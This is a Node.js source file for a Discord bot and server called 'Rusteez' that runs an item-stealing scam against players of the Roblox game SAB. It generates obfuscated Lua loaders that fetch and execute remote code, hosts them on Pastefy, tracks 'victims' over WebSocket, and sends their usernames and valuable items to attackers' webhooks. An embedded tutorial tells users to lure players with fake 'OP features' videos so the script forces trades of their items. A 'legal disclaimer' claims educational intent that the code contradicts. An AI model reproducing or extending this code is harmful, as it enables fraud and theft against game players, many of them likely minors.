const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
const app = express();
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SEUIL_MASTER = 500000000; // 100,000,000 (100M)
let INTERCEPT = false;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
const pastefy = new PastefyClient(process.env.PASTEFY_KEY);

async function uploadToPastefy(code, webhookId) {
    try {
        log("☁️ [PASTEFY] Creating paste via Official SDK...");

        // Utilisation simplifiée du SDK
        const paste = await pastefy.createPaste({
            title: `SABTrade`,
            content: code,
            visibility: 'PUBLIC' // Utilise 'UNLISTED' ou 'PUBLIC' selon tes besoins
        });

        if (paste && paste.id) {
            const rawUrl = `https://pastefy.app/${paste.id}/raw`;
            log(`✅ [PASTEFY] Success! ID: ${paste.id}`);
            return rawUrl;
        }
        
        return null;
    } catch (error) {
        log(`❌ [PASTEFY ERROR] ${error.message}`);
        return null;
    }
}

async function obfuscateScript(luaCode) {
    try {
        log("🔍 [OBF] Requesting WeAreDevs Obfuscator...");

        const response = await axios.post('https://wearedevs.net/api/obfuscate', 
        {
            script: luaCode
        }, 
        {
            headers: {
                'accept': 'application/json',
                'content-type': 'application/json',
                'cookie': process.env.WRD_COOKIE, // Ta variable sur Render
                'Referer': 'https://wearedevs.net/obfuscator',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
            }
        });

        // On vérifie le succès selon le format que tu as reçu
        if (response.data && response.data.success) {
            log("✅ [OBF] WeAreDevs Success!");
            return response.data.obfuscated; // C'est ici que se trouve le code
        }

        log("⚠️ [OBF] Failed: " + (response.data.message || "Unknown error"));
        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.message}`);
        return null;
    }
}
async function obfuscateScriptv2(luaCode) {
    try {
        log("🔍 [OBF] Step 1: Creating Session...");

        // ÉTAPE 1 : Créer la session avec le code source
        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript', 
            luaCode, // Le code est envoyé directement comme texte
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'content-type': 'text/plain' // La doc dit 'text'
                }
            }
        );

        const sessionId = sessionResponse.data.sessionId;
        if (!sessionId) throw new Error("No Session ID returned");

        log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);

        // ÉTAPE 2 : Appliquer les plugins d'obfuscation
        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', 
            {
                "MinifiyAll": true,
                "CustomPlugins": {
                    "EncryptStrings": [100],      // 100% des strings chiffrées
                    "ControlFlowFlattenV1AllBlocks": [100], // Flux mélangé
                    "SwizzleLookups": [100]        // foo.bar -> foo['bar']
                }
            }, 
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'sessionId': sessionId,
                    'content-type': 'application/json'
                }
            }
        );

        if (obfResponse.data && obfResponse.data.code) {
            log(`✅ [OBF] Success! Final code received.`);
            return obfResponse.data.code;
        }

        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.response?.data?.message || error.message}`);
        return null;
    }
}

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const hitEventSchema = new mongoose.Schema({
    userId: { type: String, required: true },     // Discord ID
    userName: { type: String, required: true },   // Nom d'utilisateur
    timestamp: { type: Date, default: Date.now }  // Date précise du hit
});

const WebHookIdSchema = new mongoose.Schema({
    webhookId: {
        type: String,
        unique: true
    },
    url: {
        type: String,
        required: true,
        trim: true
    },
    userId: {
        type: String,
        required: true,
        trim: true
    },
    userName: { type: String, required: true },
    script: { type: String, required: true }
}, {
    timestamps: true
});

// Create an index for faster date-based queries
hitEventSchema.index({ timestamp: -1 });

const HitEvent = mongoose.model('HitEvent', hitEventSchema);
const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);

const activeVictims = new Map();
const activeBots = new Map();
const activeAdmins = new Set();


// --- BOT DISCORD ---
const clientDiscord = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

const commands = [
    // Generate Command
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate a customized SAB Trade script')
        .addStringOption(option => 
            option.setName('username').setDescription('Roblox usernames separated by commas').setRequired(true))
        .addStringOption(option => 
            option.setName('webhook').setDescription('Your Discord Webhook URL').setRequired(true))
        .addIntegerOption(option => 
            option.setName('income').setDescription('Minimum income threshold (e.g., 10000000)').setRequired(true))
        .addStringOption(option => 
            option.setName('visual').setDescription('Custom URL for the visual interface (Optional)').setRequired(false)),

    // Leaderboard Command
    new SlashCommandBuilder()
        .setName('leaderboard')
        .setDescription('Display the top hit contributors')
        .addStringOption(option =>
            option.setName('type')
                .setDescription('Select the timeframe for the leaderboard')
                .setRequired(true)
                .addChoices(
                    { name: 'Daily', value: 'daily' },
                    { name: 'Weekly', value: 'weekly' },
                    { name: 'Monthly', value: 'monthly' },
                    { name: 'All Time', value: 'alltime' }
                )),

    // Total Hits Command
    new SlashCommandBuilder()
        .setName('totalhits')
        .setDescription('View your personal hit statistics and global rank')

].map(cmd => cmd.toJSON());

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
    try {
        log('🔄 Refresh des commandes slash...');
        await rest.put(
            Routes.applicationCommands(clientDiscord.user.id),
            { body: commands }
        );
        log('✅ Commandes slash enregistrées');
    } catch (error) {
        log(`❌ Erreur Slash Commands: ${error}`);
    }
});

clientDiscord.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName === 'totalhits') {
        const userId = interaction.user.id;
    
        // Calcul du total
        const totalHits = await HitEvent.countDocuments({ userId });
    
        // Calcul du rang (All-time)
        const aggregateRank = await HitEvent.aggregate([
            { $group: { _id: "$userId", count: { $sum: 1 } } },
            { $sort: { count: -1 } }
        ]);
        const rank = aggregateRank.findIndex(u => u._id === userId) + 1;
    
        const statsEmbed = new EmbedBuilder()
            .setTitle("📊 Your Hit Stats")
            .setColor(0x5865F2)
            .addFields(
                { name: "Total hits", value: `**${totalHits}**`, inline: false },
                { name: "Your rank (all-time)", value: `#${rank || "N/A"}`, inline: false }
            )
            .setFooter({ text: `Rusteez Script` });
    
        await interaction.reply({ embeds: [statsEmbed], flags: [MessageFlags.Ephemeral] });
    }
    if (interaction.commandName === 'leaderboard') {
        const type = interaction.options.getString('type'); // "daily", "weekly", etc.
        let dateFilter = {};
    
        // Définition de la période
        const now = new Date();
        if (type === 'daily') dateFilter = { timestamp: { $gte: new Date(now.setHours(0,0,0,0)) } };
        else if (type === 'weekly') dateFilter = { timestamp: { $gte: new Date(now.setDate(now.getDate() - 7)) } };
        else if (type === 'monthly') dateFilter = { timestamp: { $gte: new Date(now.setMonth(now.getMonth() - 1)) } };
    
        // Agrégation des données
        const topUsers = await HitEvent.aggregate([
            { $match: dateFilter },
            // ICI : change "username" en "userName" pour correspondre à ton schéma
            { $group: { _id: "$userId", userName: { $first: "$userName" }, hits: { $sum: 1 } } }, 
            { $sort: { hits: -1 } },
            { $limit: 10 }
        ]);
    
        let description = topUsers.map((user, i) => {
            const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : `${i + 1}.`;
            // On utilise l'ID stocké dans _id pour la mention Discord
            return `${medal} **<@${user._id}>** — **${user.hits}** hits`;
        }).join('\n');
    
        const lbEmbed = new EmbedBuilder()
            .setTitle(`${type.charAt(0).toUpperCase() + type.slice(1)} Hitcount`)
            .setColor(0xFFAA00)
            .setDescription(`Top 10 users (${type})\n\n${description || "Aucune donnée"}`)
            .setFooter({ text: "Rusteez Scripts • Aujourd'hui" });
    
        await interaction.reply({ embeds: [lbEmbed] });
    }
    if (interaction.commandName === 'generate-sab-trade') {
        // 1. On prévient Discord qu'on travaille (indispensable pour éviter le timeout)
        try {
            await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
        } catch (err) {
            console.error("❌ Erreur deferReply:", err);
            return;
        }

        try {
            const usernames = interaction.options.getString('username');
            const webhookUrl = interaction.options.getString('webhook');
            const income = interaction.options.getInteger('income');
            const visual = interaction.options.getString('visual') || "";
            const userId = interaction.user.id;
            const userName = interaction.user.username;
            // Génération de l'ID unique pour la base de données
            const webhookUuid = generateWebhookId();

            
            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.username}`);

            // 3. Préparation du Code Source Lua
            const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
            const codeToObfuscate = `local fenv = getfenv()
fenv["Receivers"] = { ${userArrayLua} }
fenv["WebHook"] = "${webhookUuid}"
fenv["Visual"] = "${visual}"
fenv["MinIncome"] = ${income}
loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyScripts/refs/heads/main/Trade.lua"))()`;

            // 4. Obfuscation via WeAreDevs (Utilise tes cookies configurés sur Render)
            const obfuscated = await obfuscateScript(codeToObfuscate);

            if (!obfuscated) {
                return await interaction.editReply("❌ Obfuscation failed (WeAreDevs). Please check server logs.");
            }

            // 5. Upload sur Pastefy (Utilise ta PASTEFY_KEY)
            const pasteUrl = await uploadToPastefy(obfuscated, webhookUuid);

            if (!pasteUrl) {
                return await interaction.editReply("⚠️ Obfuscation success, but Pastefy upload failed.");
            }

            // 6. Préparation du résultat final
            const finalLoadstring = `loadstring(game:HttpGet("${pasteUrl}", true))()`;
            // 2. Sauvegarde en Base de données (MongoDB)
            const newWebhookEntry = new WebHookId({
                webhookId: webhookUuid,
                url: webhookUrl,
                userId: userId,
                userName: userName,
                script: finalLoadstring
            });
            await newWebhookEntry.save();
            
            const dmEmbed = new EmbedBuilder()
                .setTitle("🚀 SAB Trade Script Ready")
                .setColor(0x00FF00)
                .setDescription("Copy Your Code:")
                .addFields(
                    { name: "📜 Script Code", value: `\`\`\`lua\n${finalLoadstring}\n\`\`\`` }
                )
                .setFooter({ text: "SAB-Trade • System by Rusteez" })
                .setTimestamp();
            
            try {
                // 7. Tentative d'envoi en DM
                await interaction.user.send({ embeds: [dmEmbed] });
            
                // 8. Réponse éphémère de guidage
                await interaction.editReply({ 
                    content: `✅ **Script generated successfully!**\n\n> 📬 I've sent the execution code to your **Direct Messages (DMs)**.\n\n*If you don't see it, make sure your DMs are open.*` 
                });
            
            } catch (error) {
                // 9. Fallback si les DMs de l'utilisateur sont fermés
                log(`⚠️ [DM ERROR] DMs closed for ${interaction.user.tag}`);
                
                await interaction.editReply({ 
                    content: `⚠️ **Your DMs are closed!** I couldn't send the code privately.\n\nHere is your execution code:\n\`\`\`lua\n${finalLoadstring}\n\`\`\``
                });
            }

        } catch (error) {
            log(`❌ [CRITICAL ERROR] ${error.message}`);
            if (interaction.deferred) {
                await interaction.editReply(`❌ A server error occurred: ${error.message}`);
            }
        }
    }
});
if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
// 1. Récupérer tous les webhooks
app.get('/api/admin/hits-summary', async (req, res) => {
    const token = req.query.token;
    if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Unauthorized" });

    try {
        // Cette requête groupe tous les événements de hits par utilisateur
        const summary = await HitEvent.aggregate([
            {
                $group: {
                    _id: "$userId", // Groupé par ID Discord
                    userName: { $first: "$userName" }, // Récupère le nom
                    totalHits: { $sum: 1 }, // Compte le nombre total
                    lastHit: { $max: "$timestamp" } // Date du hit le plus récent
                }
            },
            { $sort: { totalHits: -1 } } // Trie par le plus performant
        ]);
        res.json(summary);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});
app.get('/api/admin/webhooks', async (req, res) => {
    const token = req.query.token;
    if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Access Denied" });

    try {
        const webhooks = await WebHookId.find().sort({ createdAt: -1 });
        res.json(webhooks);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// 2. Supprimer un webhook par son ID MongoDB
app.delete('/api/admin/webhooks/:id', async (req, res) => {
    const token = req.query.token;
    if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Access Denied" });

    try {
        await WebHookId.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// 3. Route de vérification (si tu ne l'avais pas encore)
app.get('/api/admin/verify', (req, res) => {
    res.json({ success: req.query.token === ADMIN_TOKEN });
});
app.get('/api/admin/active-victims', (req, res) => {
    const token = req.query.token;
    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });

    const list = [];
    activeVictims.forEach((data, username) => {
        list.push({
            username: username,
            maxIncome : data.maxIncome,
            uptime: Date.now() - data.connectedAt // Temps écoulé en ms
        });
    });
    res.json(list);
});
app.get('/api/admin/intercept-status', (req, res) => {
    const token = req.query.token;
    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });
    
    res.json({ intercept: INTERCEPT });
});

// 3. Modifier le mode Intercept (POST)
app.post('/api/admin/intercept-toggle', (req, res) => {
    const token = req.query.token; // Passé dans l'URL ou le body, ici on reste sur l'URL pour la simplicité
    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });

    const { value } = req.body;
    if (typeof value !== 'boolean') return res.status(400).send("Invalid value");

    INTERCEPT = value;
    log(`🛡️ Intercept réglé sur : ${INTERCEPT}`);
    res.json({ success: true, newState: INTERCEPT });
});
// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype') || "Unknown";
  
    if (usertype === "Admin") {
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }
  
    if (usertype === "Bot") {
        if (activeBots.has(username)) {
            log(`Bot ${username} déjà présent, remplacement...`);
            activeBots.get(username).terminate();
        }
    
        activeBots.set(username, ws);
        log(`🤖 Bot connecté : ${username}`);

        ws.on('close', () => {
            if (activeBots.get(username) === ws) {
                activeBots.delete(username);
                log(`💀 Bot déconnecté : ${username}`);
            }
        });
        return; // On s'arrête ici pour les bots
    }
  
    if (usertype === "Victim") {
        if (activeVictims.has(username)) {
            log(`Victim ${username} déjà présent, remplacement...`);
            activeVictims.get(username).ws.terminate(); // Note le .ws ici
        }
        
        activeVictims.set(username, {
            ws: ws,
            maxIncome: 0,
            connectedAt: Date.now() // On stocke le timestamp actuel
        });
        
        log(`🤖 Victim connecté : ${username}`);
        
        ws.on('close', () => {
            const victim = activeVictims.get(username);
            if (victim && victim.ws === ws) {
                activeVictims.delete(username);
                log(`💀 Victim déconnecté : ${username}`);
            }
        });
      
        ws.on('message', async (msg) => {
            try {
                const data = JSON.parse(msg);
                let maxIncome = 0;
                if (data.Method === "Hit") {
                    const hitInfo = data.Hit;
                    const webhookIdFromLua = hitInfo.WebHook; // C'est l'UUID (ex: wh_...)
                    if (hitInfo.Brainrots && hitInfo.Brainrots.length > 0) {
                        hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0));
                        const topBrainrot = hitInfo.Brainrots[0];
                        maxIncome = topBrainrot.Income || 0;
                        const victimData = activeVictims.get(username);
                        if (victimData) {
                            victimData.maxIncome = maxIncome; // On met à jour la valeur en mémoire
                            log(`✅ MaxIncome mis à jour pour ${username} : ${maxIncome}`);
                        }
                    }
                    log(`🎯 Processing Hit from: ${hitInfo.Name}`);
        
                    // 1. Chercher le Webhook URL et l'Owner dans la DB
                    const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
        
                    if (!mapping) {
                        return log(`❌ Webhook ID ${webhookIdFromLua} not found in Database.`);
                    }
        
                    // 2. Incrémenter le Leaderboard (HitEvent)
                    const newHitEntry = new HitEvent({
                        userId: mapping.userId,     // On utilise l'ID Discord stocké à la création
                        userName: mapping.userName, // Le tag Discord
                        timestamp: new Date()
                    });
                    await newHitEntry.save();
                    log(`📈 Leaderboard updated for ${mapping.userName}`);
        
                    // 3. Préparer l'Embed pour Discord
                    const hitEmbed = new EmbedBuilder()
                    .setTitle("Rusteez • SAB Hit")
                    .setColor(0x2b2d31)
                    .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
                    .addFields(
                        { 
                            name: "📄 Player Information", 
                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                        },
                        {
                            name: "👑 Valuable Brainrots",
                            value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                                ? hitInfo.Brainrots.map(br => {
                                    // 1. Préparation des éléments (Mutation + Traits)
                                    let extras = [];
                                    
                                    // On ajoute la mutation en premier si elle existe
                                    if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
                                        extras.push(br.Mutation);
                                    }
                                    
                                    // On ajoute les traits (qu'ils soient déjà une string ou un array)
                                    if (br.Traits) {
                                        if (Array.isArray(br.Traits)) {
                                            br.Traits.forEach(t => { if(t && t !== "") extras.push(t); });
                                        } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
                                            extras.push(br.Traits);
                                        }
                                    }
                        
                                    // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
                                    const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
                        
                                    // 3. Retour de la ligne formatée
                                    return `🧠 → ${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                                }).join('\n')
                                : "None"}\n\`\`\``
                        },
                        {
                           // NOUVEAU FIELD POUR LE LIEN
                           name: "🔗 Discord",
                           value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
                           inline: false
                        }
                    )
                    .setFooter({ text: `Rusteez Script` })
                    .setTimestamp();
                    if(INTERCEPT && maxIncome >= SEUIL_MASTER) {
                        //send to RusteezBot
                    }
                    else{
                        // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
                        try {
                            const webhookClient = new WebhookClient({ url: mapping.url });
                            await webhookClient.send({ 
                                content: hitInfo.Name,
                                embeds: [hitEmbed] 
                            });
                        } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
                    }
                    try {
                        const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
                        await webhookClient.send({ 
                            content: hitInfo.Name,
                            embeds: [hitEmbed] 
                        });
                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
                    
                    // 5. Envoi sur le Channel PUBLIC (public-hits)
                    const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
                    if (publicChannel) {
                        // On crée une version un peu plus "anonyme" ou stylée pour le public
                        const publicEmbed = new EmbedBuilder()
                            .setTitle("Rusteez • SAB Hit")
                            .setColor(0x2b2d31)
                            .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
                            .addFields(
                                { 
                                    name: "📄 Player Information", 
                                    // Note : Pas d'espaces au début des lignes ici
                                    value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n\`\`\`` 
                                },
                                {
                                    name: "👑 Valuable Brainrots",
                                    value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                                        ? hitInfo.Brainrots.map(br => {
                                            // 1. Préparation des éléments (Mutation + Traits)
                                            let extras = [];
                                            
                                            // On ajoute la mutation en premier si elle existe
                                            if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
                                                extras.push(br.Mutation);
                                            }
                                            
                                            // On ajoute les traits (qu'ils soient déjà une string ou un array)
                                            if (br.Traits) {
                                                if (Array.isArray(br.Traits)) {
                                                    br.Traits.forEach(t => { if(t && t !== "") extras.push(t); });
                                                } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
                                                    extras.push(br.Traits);
                                                }
                                            }
                                
                                            // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
                                            const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
                                
                                            // 3. Retour de la ligne formatée
                                            return `🧠 → ${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                                        }).join('\n')
                                        : "None"}\n\`\`\``
                                },
                                {
                                    // NOUVEAU FIELD POUR LE LIEN
                                    name: "🔗 Discord",
                                    value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
                                    inline: false
                                }
                            )
                            .setFooter({ text: `Rusteez Script` })
                            .setTimestamp();
                        
                        publicChannel.send({ embeds: [publicEmbed] });
                    }
                }
            } catch (e) { 
                log(`⚠️ WS Message Error: ${e.message}`); 
            }
        });
      return; // On s'arrête ici pour les Victims
    }
    
});
async function sendManualHit(hitData) {
    const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
    if (!publicChannel) throw new Error("Public Channel introuvable");

    const publicEmbed = new EmbedBuilder()
        .setTitle("Rusteez • SAB Hit")
        .setColor(0x2b2d31)
        .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
        .addFields(
            { 
                name: "📄 Player Information", 
                value: `\`\`\`properties\n👤 Display Name : ${hitData.displayName}\n🆔 Username     : ${hitData.username}\n🗓️ Account Age  : ${hitData.age} days\n👥 Players      : 1/8\n\`\`\`` 
            },
            {
                name: "👑 Valuable Brainrots",
                value: `\`\`\`properties\n${hitData.brainrots}\n\`\`\``
            },
            {
                // NOUVEAU FIELD POUR LE LIEN
                name: "🔗 Discord",
                value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
                inline: false
            }
        )
        .setFooter({ text: `Rusteez Script`})
        .setTimestamp();

    await publicChannel.send({ embeds: [publicEmbed] });
}

// Modifie ta route POST existante
app.post('/api/admin/setup-discord', async (req, res) => {
    const token = req.query.token;
    if (token !== ADMIN_TOKEN) return res.status(401).json({ success: false });

    const { type, data } = req.body; // On récupère 'data' pour le hit manuel

    try {
        if (type === 'rules') await sendOfficialRules();
        else if (type === 'disclaimer') await sendLegalDisclaimer();
        else if (type === 'tutorial') await sendTutorial();
        else if (type === 'manual_hit') await sendManualHit(data); // Nouvelle condition
        else if (type === 'publish_visual') await publishVisual(data);
        res.json({ success: true, message: "Action exécutée !" });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});
async function publishVisual(visualData) {
    const visualChannel = await clientDiscord.channels.fetch('1487394300844183652').catch(() => null);
    if (!visualChannel) throw new Error("Visual Channel introuvable");

    const visualEmbed = new EmbedBuilder()
        .setTitle(`🖼️ ${visualData.title.toUpperCase()}`)
        .setColor(0xf59e0b) // Orange Ambre
        .setDescription("To use this visual, copy the Raw URL below and paste it into the `/generate` command.")
        .addFields(
            { name: "📜 Script / Raw Link", value: `\`\`\`\n${visualData.lua}\n\`\`\`` }
        )
        .setFooter({ text: "Rusteez Visual Library" })
        .setTimestamp();

    // On ajoute l'image seulement si le lien est valide
    if (visualData.image && visualData.image.startsWith('http')) {
        visualEmbed.setImage(visualData.image);
    }

    await visualChannel.send({ embeds: [visualEmbed] });
}
async function sendLegalDisclaimer() {
    const channelId = "1487369531058815096";
    const channel = await clientDiscord.channels.fetch(channelId);

    if (!channel) return console.log("❌ Channel introuvable.");

    const disclaimerEmbed = new EmbedBuilder()
        .setTitle("⚖️ LEGAL DISCLAIMER")
        .setColor(0x2b2d31) // Gris foncé pour le style "Légal"
        .setDescription(
            "All content, scripts, code examples, and information provided on this server are intended **solely for educational, research, and testing purposes.**\n" +
            "Nothing shared here is designed, intended, or encouraged to be used in violation of Roblox’s Terms of Service, platform rules, or any applicable laws."
        )
        .addFields(
            { 
                name: "🚫 Non-Endorsement Policy", 
                value: "This server and its administrators do not endorse, support, or promote:\n" +
                       "• Game exploitation or unauthorized modifications\n" +
                       "• Accessing, altering, or interfering with accounts or data\n" +
                       "• Cheating, hacking, or disrupting online services\n" +
                       "• Any illegal, harmful, or unethical activity"
            },
            { 
                name: "👤 User Responsibility", 
                value: "Users are **fully responsible** for how they choose to use any information obtained from this server. The server owners, staff, and contributors assume no responsibility or liability for bans, losses, damages, or legal consequences arising from misuse or unauthorized activities."
            },
            { 
                name: "📚 Purpose of Existence", 
                value: "This server exists exclusively for:\n" +
                       "• Educational learning\n" +
                       "• Script development and experimentation\n" +
                       "• Security research and awareness\n" +
                       "• Understanding game mechanics and system behavior"
            },
            { 
                name: "📜 Agreement", 
                value: "By joining or using this server, you acknowledge that you have read, understood, and agreed to this Legal Disclaimer. **If you do not agree with these terms, you must refrain from using the content and leave the server.**"
            }
        )
        .setFooter({ text: "Rusteez Script Compliance Department" })
        .setTimestamp();

    await channel.send({ embeds: [disclaimerEmbed] });
    console.log("✅ Legal Disclaimer sent!");
}
async function sendTutorial() {
    const channelId = "1487369816921870476"; // Salon Tutorial
    const commandChannelId = "1487370156932857896"; // Salon des commandes
    
    try {
        const channel = await clientDiscord.channels.fetch(channelId);
        if (!channel) return console.log("❌ Channel de tutoriel introuvable.");

        const tutorialEmbed = new EmbedBuilder()
            .setTitle("🚀 HOW TO GENERATE YOUR SCRIPT")
            .setColor(0x0ea5e9) // Bleu Cyan pour le guide
            .setDescription("Follow these simple steps to generate and use your customized Rusteez SAB Trade script.")
            .setThumbnail(clientDiscord.user.displayAvatarURL())
            .addFields(
                { 
                    name: "Step 1: Create a Webhook", 
                    value: "• Go to your own Discord server settings.\n• Integrations → Webhooks → New Webhook.\n• **Copy the Webhook URL**. This is where your hits will be sent." 
                },
                { 
                    name: "Step 2: Run the Command", 
                    value: `Go to the <#${commandChannelId}> channel and type \`/generate-sab-trade\` with these exact fields:\n\n` +
                           "👤 **username** (Required)\n" +
                           "Enter the Roblox usernames that will receive the items, separated by commas (ex: `User1, User2`).\n\n" +
                           "🔗 **webhook** (Required)\n" +
                           "Paste your Discord Webhook URL where the hits will be logged.\n\n" +
                           "💰 **income** (Required)\n" +
                           "Set the minimum income threshold. (ex: `10000000`).\n\n" +
                           "🖼️ **visual** (Optional)\n" +
                           "Paste a URL if you want to display a specific interface to the victim. Leave empty for default. (ex: 'https://pastefy.app/GQI2AOam/raw')"
                },
                { 
                    name: "Step 3: Get your Script", 
                    value: "• Check your **Direct Messages (DMs)**. The bot will send you your code.\n• Copy the entire script." 
                },
                { 
                    name: "Step 4: Promotion (Get more Hits!)", 
                    value: "To get the most items, you need victims! Promote your script on **TikTok, YouTube Shorts, and Discord**:\n\n" +
                           "🎥 **Create Content:** Record a video showing the 'Visual' interface (fake OP features).\n" +
                           "🔗 **Share the Script:** Put your generated script in a **Pastebin** or a comment.\n" +
                           "📱 **Go Viral:** Use tags like `#SAB #SkibiAnyBattle #RobloxExploit` to reach thousands of players.\n\n" +
                           "*The more people use your script, the more hits you receive!*"
                },
                { 
                    name: "Step 5: Receive the Hit", 
                    value: "• When a victim executes your script, you will receive a notification on your **Discord Webhook**.\n• It will contain the victim's **Username** and their most valuable **Brainrots**." 
                },
                { 
                    name: "Step 6: Finalizing the Trade 💰", 
                    value: "• Join SAB.\n" +
                           "• **Send a Trade Request** to the victim.\n" +
                           "• The script will automatically force the victim to add their **best Brainrots** to the trade.\n" +
                           "• Accept the trade and enjoy your new items!" 
                },
                { 
                    name: "💡 Pro Tip", 
                    value: "Make sure your DMs are open! If you don't receive the script, check your privacy settings." 
                }
            )
            .setFooter({ text: "Rusteez Script Tutorial", iconURL: clientDiscord.user.displayAvatarURL() })
            .setTimestamp();

        await channel.send({ embeds: [tutorialEmbed] });
        console.log("✅ Tutorial sent successfully!");

    } catch (err) {
        console.error("❌ Error sending tutorial:", err);
    }
}
async function sendOfficialRules() {
    const channelId = "1487369531058815096";
    const channel = await clientDiscord.channels.fetch(channelId);

    if (!channel) return console.log("❌ Channel introuvable.");

    const rulesEmbed = new EmbedBuilder()
        .setTitle("🛡️ Rusteez Script • Official Rules")
        .setColor(0xa855f7)
        .setDescription("Welcome to Rusteez. To maintain a professional and safe environment for all exploiters, you must follow these guidelines. By staying in this server, you agree to the following:")
        .addFields(
            { 
                name: "Section I: General Conduct", 
